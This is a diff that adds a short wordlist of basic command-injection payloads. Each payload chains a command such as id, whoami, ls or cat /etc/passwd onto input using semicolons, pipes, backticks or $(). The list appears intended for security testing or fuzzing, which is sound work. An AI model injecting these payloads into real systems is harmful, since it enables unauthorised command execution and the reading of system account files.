@@ -1,0 +1,11 @@
+# Basic RCE (Remote Code Execution) Payloads
+;id
+|id
+`id`
+$(id)
+;whoami
+|whoami
+;ls
+|ls -la
+;cat /etc/passwd
+|cat /etc/passwd
